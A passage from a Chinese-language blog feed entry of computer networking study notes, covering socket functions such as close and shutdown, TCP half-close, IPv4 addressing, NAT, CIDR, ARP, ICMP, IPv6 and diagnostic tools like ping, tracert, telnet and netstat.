-项:客户已经发出建立连接请求，且请求已到达服务器，而服务器正在等待完成相应的TCP三路握手过程(服务器已发出第二个分节，等待客户端的第三个分节)。这些套接字处于SYN_ RCVD状态。</p></li><li><p>已完成连接队列。</p><p>每个已完成TCP三路握手过程的客户对应其中- -项。这些套接字处于ESTABLISHED状态。</p></li></ul></li><li><p><strong>connect()函数</strong></p><p>TCP客户用connect函数来<strong>建立与TCP服务器的连接</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>connect函数的第一个参数即为客户端的套接字，第二参数为一个指向套接口地址结构的指针，第三个参数为第二个参数中结构体的长度。</p></li><li><p><strong>accept()函数</strong></p><p>accept函数由TCP服务器调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span> <span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr addr, <span class="type">socklen_t</span> addrlen)</span> </span>;</span><br></pre></td></tr></table></figure><p>accept函数的第一个参 数为服务器的套接字，第二个参数用于返回客户端的协议地址，第三个参数为协议地址的长度。</p><p>如果accept成功，那么其返回值是由内核自动生成的<strong>一个全新的描述字</strong>，代表与所返回客户的TCP连接。</p></li><li><p><strong>close()函数</strong></p><p>close函数用来关闭套接口，并终止TCP连接。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">close</span><span class="params">(<span class="type">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>close一个TCP套接口的默认行为是把该套接口标记为已关闭，然后立即返回到调用进程。<strong>该套接字<u>不能再由调用进程使用</u><strong>，也就是说不能再作为read或write的第-一个参数。<br>注意：close操作</strong>只是使相应套接字的引用计数减1</strong>，<u>只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求</u>（激发TCP的正常连接终止序列,即发送FIN)）。</p></li><li><p><strong>shutdown()函数</strong></p><p>关闭一个socket有2种方法，分别是close与shutdown。</p><p>shutdown函数的原型是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shutdown</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> howto)</span></span>;</span><br></pre></td></tr></table></figure><p>sockfd是需要关闭的套接口描述字。参数howto允许为shutdown操作选择以下几种方式:</p><p>SHUT_RD：关闭连接的读端。也就是该套接字不再接收数据，任何当前在套接字接收缓冲区的数据将被丢弃，但仍可写。进程将不能对该套接字发出任何读操作。调用之后接收到的任何数据将被确认然后无声丢弃掉。注意此时并不发送FIN。</p><p>SHUT_WR：关闭连接的写端，进程不能再对此套接字发出写操作，但仍可读。对于TCP的套接字(socket)， 这称为半关闭，当前留在套接字发送缓冲区中的数据将被发送掉。不管套接字的引用计数是否等于0,关闭写端的操作都会执行，即会发送FIN。</p><p>SHUT_ RDWR：相当于调用shutdown两次：第一次指定howto为SHUT_ RD，第二次指定howto为SHUT_WR。</p><p><strong>&#x3D;&#x3D;close和shutdown的区别：&#x3D;&#x3D;</strong></p><ul><li>close 会关闭连接，并释放所有连接对应的资源，**套接字<u>不能再由调用进程使用</u>**，即它不能再作为read或write的参数；而 shutdown 并不会释放掉套接字和所有的资源，关闭读仍然可以write，关闭写仍然可以read。</li><li><strong>close 存在引用计数</strong>的概念，调用时把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>；<strong>shutdown 则不管引用计数，直接使得该套接字不可用</strong>，如果有别的进程企图使用该套接字，将会受到影响。</li><li>close 的引用计数导致<strong>不一定会发出 FIN 结束报文</strong>，而 <strong>shutdown 则总是会发出 FIN 结束报文</strong>，这在我们打算关闭连接通知对端的时候，是非常重要的。</li><li><strong>close函数同时终止两个方向的数据传送：读和写。shutdown可以只终止一个方向的数据传送。</strong></li></ul></li><li><p><strong>TCP的半关闭</strong></p><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。这就是所谓的半关闭，<strong>半关闭是通过调用shutdown函数代替close函数实现的</strong>。</p><p>图2-7显示了一个半关闭的典型例子。让左方的客户端开始半关闭，当然也可以由另一端开始。开始的两个报文和四次挥手一致，初始端发出FIN，接着是另一端对这个FIN的ACK报文段。但后面就和四次挥手不同，因为接收半关闭的一方仍能发送数据。我们只显示一个数据报文段和一个ACK报文段，但可能发送了许多数据报文段。当收到半关闭的一端在完成它的数据传送后， 将发送一个 FIN<br>关闭这个方向的连接，这将传送一个文件结束符给发起这个半关闭的应用进程。当对第二个FIN进行确认后，这个连接便彻底关闭了。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704181311157.png" alt="image-20220704181311157"></p><p>终止网络连接的通常方法是调用close 函数。不过&#x3D;&#x3D;<strong>close有两个限制</strong>，通常可使用shutdown 函数来避免&#x3D;&#x3D;。</p><ul><li><p><strong>close无法直接终止连接</strong></p><p>close函数把套接字的引用计数减1，<strong>仅在该计数变为0时才关闭套接字</strong>。</p><p>使用shutdown（howto参数为SHUT_RDWR或SHUT_WR时）可以<strong>不管引用计数就激发TCP的正常连接终止序列</strong>。</p></li><li><p><strong>close只能同时终止两个方向的数据传送</strong></p><p>close 函数<strong>同时终止数据传送的两个方向：读和写</strong>。</p><p>但是TCP连接是全双工的，有时候我们需要关闭写但仍然可以继续读，shutdown 函数可以完成此工作。</p></li></ul><p>&#x3D;&#x3D;<strong>注意：</strong>&#x3D;&#x3D;</p><ol><li><p>如果有多个进程共享一个套接字，close 每被调用一次，计数减1，直到计数为0时，也就是所有进程都调用了close, 套接字将被释放。</p></li><li><p>在多进程中，如果一个进程调用shutdown(fd, SHUT_ RDWR)后其他的进程将无法利用此套接字进行通信。如果一个进程调用close(sfd)将不会影响到其他进程。</p></li></ol></li></ol><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="3-1-IPv4地址及网络地址转换NAT"><a href="#3-1-IPv4地址及网络地址转换NAT" class="headerlink" title="3.1 IPv4地址及网络地址转换NAT"></a>3.1 IPv4地址及网络地址转换NAT</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>连接在Internet的每台主机&#x2F;路由器都分配一个<strong>32bit</strong>的全球唯一的标识符。</p><p>IP地址的编码方式有三种：分类的IP地址、子网的划分、CIDR。</p><ul><li><p>分类的IP地址</p><p>传统的IP地址是分类的地址，分为A、B、C、D、E五类。均由网络号和主机号组成，网络号代表主机所连接到的网络，主机号代表该主机或路由器在网络中的地址。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220705093309767.png" alt="image-20220705093309767"></p><p>其中，存在一些特殊的IP地址用于表示特殊用途，不作为主机IP地址：</p><ul><li>主机号全为0表示本网络本身；</li><li>主机号全为1表示本网络的广播地址；</li><li>127.0.0.1网路保留作为环路自检地址，表示任意主机本身；</li><li>32bit全为0，即0.0.0.0表示整个TCP&#x2F;IP网络；</li><li>32bit全为1，即255.255.255.255表示整个TCP&#x2F;IP网络的广播地址。</li></ul></li><li><p>子网的划分、CIDR在下一节叙述。</p></li></ul><h4 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h4><p>网络地址转换（NAT）是通过将专用网络地址（比如企业内部网Intranet）转换为公用地址（如互联网Internet），从而对外隐藏了内部管理的IP地址。通过在内部使用非注册的IP地址（私有地址），并将它们转换为一小部分外部注册的IP地址（公有地址），从而减少IP地址注册的费用以及节省IPv4地址空间。</p><p>私有IP地址值用于局域网LAN，不用于无线局域网WLAN连接。因此私有IP地址不能直接用于Internet，必须通过网关利用NAT把私有IP地址转换为Intemet中合法的全球IP地址后才能用于Intermet。私有IP地址有效地解决了IP地址不足的问题。</p><p>私有IP地址网段如下:</p><blockquote><p><strong>10.0.0.0~10.255.255.255</strong>、<strong>172.16.0.0~172.31.255.255</strong>、 <strong>192.168.0.0~192.168.255.255</strong></p></blockquote><p>在因特网中的所有路由器，对目的地址是私有地址的数据报一律不进行转发。 使用NAT时，需要在专用网连接到因特网的路由器上安装NAT软件，NAT路由器至少有一个有效的外部全球地址。普通路由器在转发数据报时不改变其源IP地址和目的IP地址，且路由器工作在网络层，而<strong>NAT路由器在转发IP数据报时，一定要更换其IP地址（按路由器中的地址转换表转换源IP地址或目的IP地址）。NAT路由器转发数据报时需要查看和转换传输层的端口，其操作没有严格的层次关系</strong>。</p><h3 id="3-2-子网划分与子网掩码、CIDR"><a href="#3-2-子网划分与子网掩码、CIDR" class="headerlink" title="3.2 子网划分与子网掩码、CIDR"></a>3.2 子网划分与子网掩码、CIDR</h3><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><p>各类地址的默认子网掩码：</p><p><strong>A类: 255.0.0.0</strong><br><strong>B类: 255.255.0.0</strong><br><strong>C类: 255.255.255.0</strong></p><p>使用子网划分时的地址格式：</p><p><strong>A类网络：8位    +  子网X位  +  主机24-X位</strong><br><strong>B类网络：16 位 +  子网X位  +  主机16-X位</strong><br><strong>C类网络：24位  +  子网X位  +  主机8-X位</strong></p><h4 id="无分类编址CIDR"><a href="#无分类编址CIDR" class="headerlink" title="无分类编址CIDR"></a>无分类编址CIDR</h4><p><strong>分类的IP地址的缺点：</strong></p><p>比如一个A类地址对应的是2^24 - 2个IP地址(网络地址和广播地址)，这个是个天文数字，一个公司或者组织是无法完全利用这么多IP地址的，就造成了IP地址的浪费。</p><p><strong>CIDR</strong>是在使用变长度子网掩码的基础上提出的一种消除传统A、B、C类网络划分，并且可以在软件的支持下实现超网构造的一种IP地址的网络划分方法。这样可以大幅度提高IP地址空间的利率，并减小路由表大小，提高路由器的路由转发能力。</p><p>无分类编址的做法是将IP分为两部分：</p><p>1、<strong>网络前缀</strong></p><p>网络号对应的是一个网络地址，一个网络可以容纳多个主机，主机的网络号相同。</p><p>2、<strong>主机号</strong></p><p>唯一标识一个主机在一个网络中的id。</p><p>怎么区分网络号和主机号呢？</p><p>使用斜线记法，即IP地址&#x2F;网络前缀所占比特数，xx:xx:xx:xx&#x2F;n<br>在IP地址后边加入了 &#x2F;n ，n代表前n位为网络号。</p><p>CIDR的主要特点：</p><ol><li><p>消除了传统的A、B、C类地址以及子网的概念，因而可以<strong>更加有效地分配IPv4的地址空间</strong>。CIDR使用“网络前缀”概念代替子网络概念。这样IP地址分为两部分:网络前缀、主机号。CIDR使用斜线记法，即IP地址&#x2F;网络前缀所占比特数。其中，网络前缀所占比特数对应于网络<br>的部分，等效于子网掩码中连续1的部分。</p></li><li><p>将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以包括多个A、B、C类地址，这种地址的聚合称为<strong>路由聚合</strong>，或称为构成<strong>超网</strong>。路由聚合<strong>使得路由表中的一个项目可以表示很多个原来传统分类地址的路由</strong>，有利于减少路由之间的路由选择信息的交换，从而提高网络性能。</p></li></ol><h3 id="3-3-ARP、RARP、ICMP"><a href="#3-3-ARP、RARP、ICMP" class="headerlink" title="3.3 ARP、RARP、ICMP"></a>3.3 ARP、RARP、ICMP</h3><ul><li><p><strong>ARP</strong></p><p>在实际网络的数据链路上传送数据时，最终必须使用硬件地址MAC。所以需要一种方法来<strong>完成IP地址址到MAC地址的映射</strong>，这就要用到地址解析协议(Address Resolution Protocol, ARP)。 <strong>每台主机(路由器) 上单独地存放一个从IP地址到MAC地址的映射表，称为ARP表</strong>。主机和路由器使用地址解析协议APR来<strong>动态维护此ARP表</strong>。MAC地址转换为IP地址使用RARP协议。</p></li><li><p><strong>ICMP</strong></p><p>为了提高IP数据报成功交付的机会，在网络层使用了网际控制报文协议(Internet Control Message Protocol, ICMP) 来使得主机或路由器可以报告差错和异常情况。<br><strong>PING命令工作在应用层</strong>，但是<strong>直接使用网络层的ICMP协议</strong>，而**<u>没有使用传输层的TCP或UDP协议</u>**。</p></li></ul><h3 id="3-4-IPv6"><a href="#3-4-IPv6" class="headerlink" title="3.4 IPv6"></a>3.4 IPv6</h3><p>IPv6由<strong>128bit</strong>构成,通常使用冒号十六进制记法表示IPv6地址，每个16bit的值用四位十六进制值表示，各值之间用冒号分割，如68E6 : 8C64 : FFFFF : 0 : 1180 : 960A : FFFF。该表示方法允许使用零压缩，即一连串连续的零可以为一对冒号所取代，如DE08:0:0:0:0:0:0:B3可以写成DE08::B3；IP 地址0:0:0:0:0:0:118.17.23.1可以写成::118.17.23.1。（这里冒号分割的是16bit，点分割的是8bit）</p><p>IPv6所引入的主要变化：</p><ol><li>更大的地址空间。IPv6 将地址从IPv4的32bit增大到了128bit；</li><li>扩展的地址层次结构。</li><li>灵活的首部格式。</li><li>改进的选项。这一特征加快了分组处理速度。</li><li>允许协议继续扩充。</li><li>支持即插即用。</li><li>支持资源的预分配。</li><li>增加了安全性，身份验证和保密验证是IPv6的关键特征。</li><li>分片限制为由源点来完成，是端到端的，路由途中的路由器不允许进行分片。</li></ol><h2 id="网络常用测试工具"><a href="#网络常用测试工具" class="headerlink" title="网络常用测试工具"></a>网络常用测试工具</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>检查网络是否通畅或者网络的连接速度。</p><p>原理：利用网络上机器<strong>IP地址的唯一性</strong>，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通、时延是多少。</p><h3 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h3><p>tracert是路由跟踪实用程序，<strong>用于确定IP数据包访问目标所采取的路径</strong>。</p><p>tracert 命令用<strong>IP生存时间(TTL) 字段</strong>和<strong>ICMP错误消息</strong>来确定从一个主机到网络上其他主机的路由。其命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert[-d] [-h maximum hops] [-j computer-list] [-W timeout] target_name</span><br></pre></td></tr></table></figure><p>可以使用tracert命令确定数据包在网络上的停止位置。例如：<code>tracert www.baidu.com</code>则会打印出从当前主机到目的主机所经过的路由地址。</p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>查看某个端口是否可访问。Telnet协议是TCP&#x2F;IP协议家族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。</p><p>例如<strong>可以用telnet测试80端口的Web服务器是否正常工作</strong>。</p><p>输入<code>telnet www .hitsz.edu.cn 80</code></p><p>然后服务器响应:<br><code>Trying 219.223.252.3...</code><br><code>Connected to www .hitsz .edu. cn</code><br><code>Escape character is &#39;^] .</code></p><p>然后输入:<br><code>GET / HTTP1.1</code></p><p>如果Web服务器正常工作的话，就会返回服务器的响应头，以便你确认服务器的情况。</p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>netstat是一个监控TCP&#x2F;IP网络的非常有用的工具，它可以<strong>显示路由表、实际的网络连接以及每一个网络接口设备的状态信息</strong>。</p><p>netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。使用格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat [-a][-e][-n][-o][-P Protocol] [-r] [-s] [Interval]</span><br></pre></td></tr></table></figure><p>一般用<code>netstat -an</code>来显示所有连接的端口并用数字表示。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机网络&quot;&gt;&lt;a href=&quot;#计算机网络&quot; class=&quot;headerlink&quot; title=&quot;计算机网络&quot;&gt;&lt;/a&gt;计算机网络&lt;/h1&gt;&lt;h2 id=&quot;计算机网络模型&quot;&gt;&lt;a href=&quot;#计算机网络模型&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
